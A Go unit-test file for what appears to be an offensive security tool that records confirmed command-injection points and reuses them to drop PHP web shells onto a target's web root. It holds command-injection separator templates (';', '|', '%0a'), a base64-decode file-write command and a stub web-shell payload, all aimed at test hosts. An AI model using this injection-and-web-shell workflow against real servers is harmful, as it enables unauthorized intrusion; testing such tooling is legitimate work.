package server

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"strings"
	"testing"

	capkit "github.com/c1ayooo/4zrec/internal/capkit/core"
	"github.com/c1ayooo/4zrec/internal/capkit/kits/shellkit"
)

func TestPointKeyNormalizesInjectMarker(t *testing.T) {
	a := pointKey("HTTP://Target.TEST:8080/exec.php?ip={{inject}}")
	b := pointKey("http://target.test:8080/exec.php?ip=")
	if a != b {
		t.Fatalf("同一个点应该归一化到同一 key:\n%s\n%s", a, b)
	}
	if pointKey(" http://x.test/a ") != pointKey("http://x.test/a") {
		t.Fatal("首尾空白没有归一化")
	}
}

func TestDeriveCmdTemplate(t *testing.T) {
	cases := []struct{ in, want string }{
		{"{{value}};printf marker", "{{value}};{{cmd}}"},
		{"{{value}}|printf marker", "{{value}}|{{cmd}}"},
		{"{{value}}%0aprintf marker", "{{value}}%0a{{cmd}}"},
		{"{{value}};{{cmd}}", "{{value}};{{cmd}}"},
		{"printf marker", ""}, // no {{value}} slot → separator is unknown
	}
	for _, c := range cases {
		if got := deriveCmdTemplate(c.in); got != c.want {
			t.Fatalf("deriveCmdTemplate(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestDropFileURL(t *testing.T) {
	if got := dropFileURL("http://h:8080/exec.php?ip={{inject}}", "w1.php"); got != "http://h:8080/w1.php" {
		t.Fatalf("got %q", got)
	}
	if got := dropFileURL("http://h:8080/app/exec.php", "w1.php"); got != "http://h:8080/app/w1.php" {
		t.Fatalf("got %q", got)
	}
}

func TestObserveProbeRecordsConfirmedPoint(t *testing.T) {
	s := &Server{capkitPoints: newConfirmedPoints()}
	input := json.RawMessage(`{"point":{"url":"http://t.test/exec.php","param":"ip","location":"query","value":"1"}}`)
	s.observeCapkitResult(context.Background(), "cmdi_probe", input, capkit.Result{
		OK:       true,
		Findings: []capkit.Finding{{Kind: "cmdi", Confirmed: true, Payload: "{{value}};printf marker"}},
	})
	pt, ok := s.capkitPoints.lookup("http://t.test/exec.php")
	if !ok {
		t.Fatal("确认的注入点没有被记录")
	}
	if pt.Template != "{{value}};{{cmd}}" || pt.Param != "ip" {
		t.Fatalf("记录内容不对: %+v", pt)
	}
}

func TestObserveProbeSkipsUnconfirmed(t *testing.T) {
	s := &Server{capkitPoints: newConfirmedPoints()}
	input := json.RawMessage(`{"point":{"url":"http://t.test/exec.php","param":"ip"}}`)
	s.observeCapkitResult(context.Background(), "cmdi_probe", input, capkit.Result{
		OK:       true,
		Findings: []capkit.Finding{{Kind: "cmdi", Confirmed: false, Payload: "{{value}};printf x"}},
	})
	if _, ok := s.capkitPoints.lookup("http://t.test/exec.php"); ok {
		t.Fatal("未确认的探测结果不得登记为可投递点")
	}
}

func TestObserveExecuteRecordsTemplate(t *testing.T) {
	s := &Server{capkitPoints: newConfirmedPoints()}
	input := json.RawMessage(`{"point":{"url":"http://t.test/exec.php","param":"ip"},"template":"{{value}};{{cmd}}","command":"id"}`)
	s.observeCapkitResult(context.Background(), "cmdi_execute", input, capkit.Result{OK: true})
	if _, ok := s.capkitPoints.lookup("http://t.test/exec.php"); !ok {
		t.Fatal("cmdi_execute 成功后应登记注入点")
	}
	// A failed execute must not (re)register anything.
	s2 := &Server{capkitPoints: newConfirmedPoints()}
	s2.observeCapkitResult(context.Background(), "cmdi_execute", input, capkit.Result{OK: false})
	if _, ok := s2.capkitPoints.lookup("http://t.test/exec.php"); ok {
		t.Fatal("失败的执行不得登记注入点")
	}
}

func TestDeployerRequiresConfirmedPoint(t *testing.T) {
	d := &capkitDeployer{points: newConfirmedPoints()}
	_, err := d.Drop(context.Background(), shellkit.WebShellDrop{
		TargetURL: "http://t.test/exec.php", Filename: "w.php", Dir: "/var/www/html", Content: []byte("x"),
	})
	if err == nil || !strings.Contains(err.Error(), "没有已确认的注入点") {
		t.Fatalf("无注入点时应给出可操作的错误: %v", err)
	}
}

func TestDeployerRequiresDir(t *testing.T) {
	points := newConfirmedPoints()
	points.record(injectionPoint{URL: "http://t.test/exec.php", Param: "ip", Template: "{{value}};{{cmd}}"})
	d := &capkitDeployer{points: points}
	_, err := d.Drop(context.Background(), shellkit.WebShellDrop{
		TargetURL: "http://t.test/exec.php", Filename: "w.php", Content: []byte("x"),
	})
	if err == nil || !strings.Contains(err.Error(), "dir 必填") {
		t.Fatalf("缺 dir 时应明确拒绝: %v", err)
	}
}

func TestDeployerWritesThroughRecordedPoint(t *testing.T) {
	payload := []byte("<?php echo 'shell'; ?>")
	points := newConfirmedPoints()
	points.record(injectionPoint{
		URL: "http://t.test/exec.php", Param: "ip", Location: "query", Value: "1",
		Template: "{{value}};{{cmd}}",
	})
	var gotTool string
	var gotInput map[string]any
	d := &capkitDeployer{
		points: points,
		call: func(_ context.Context, tool string, input json.RawMessage, _ capkit.CallContext) (capkit.Result, error) {
			gotTool = tool
			if err := json.Unmarshal(input, &gotInput); err != nil {
				t.Fatalf("投递入参不是 JSON: %v", err)
			}
			return capkit.Result{OK: true, Status: capkit.StatusSuccess, Summary: "ok"}, nil
		},
	}
	res, err := d.Drop(context.Background(), shellkit.WebShellDrop{
		TargetURL: "http://t.test/exec.php", Filename: "w123.php",
		Dir: "/var/www/html", Content: payload, Password: "s3cret_pw",
	})
	if err != nil {
		t.Fatalf("Drop: %v", err)
	}
	if gotTool != "cmdi_execute" {
		t.Fatalf("投递应复用 cmdi_execute, got %s", gotTool)
	}
	if gotInput["template"] != "{{value}};{{cmd}}" {
		t.Fatalf("模板没有透传: %v", gotInput["template"])
	}
	cmd, _ := gotInput["command"].(string)
	encoded := base64.StdEncoding.EncodeToString(payload)
	if !strings.Contains(cmd, "base64 -d") || !strings.Contains(cmd, encoded) {
		t.Fatalf("写文件命令不是 base64 解码写入: %s", cmd)
	}
	if !strings.Contains(cmd, "'/var/www/html/w123.php'") {
		t.Fatalf("落盘路径没有正确引用: %s", cmd)
	}
	if strings.Contains(cmd, "s3cret_pw") {
		t.Fatalf("口令不得出现在命令里: %s", cmd)
	}
	if res.FileURL != "http://t.test/w123.php" {
		t.Fatalf("落点 URL 不对: %s", res.FileURL)
	}
	if res.Cleanup != "rm -f '/var/www/html/w123.php'" {
		t.Fatalf("清理命令不对: %s", res.Cleanup)
	}
}

func TestDeployerSurfacesExecuteFailure(t *testing.T) {
	points := newConfirmedPoints()
	points.record(injectionPoint{URL: "http://t.test/exec.php", Param: "ip", Template: "{{value}};{{cmd}}"})
	d := &capkitDeployer{
		points: points,
		call: func(context.Context, string, json.RawMessage, capkit.CallContext) (capkit.Result, error) {
			return capkit.Result{OK: false, Status: capkit.StatusFailed, Summary: "注入点返回 500"}, nil
		},
	}
	_, err := d.Drop(context.Background(), shellkit.WebShellDrop{
		TargetURL: "http://t.test/exec.php", Filename: "w.php", Dir: "/tmp", Content: []byte("x"),
	})
	if err == nil || !strings.Contains(err.Error(), "注入点返回 500") {
		t.Fatalf("执行失败应透出信封摘要: %v", err)
	}
}
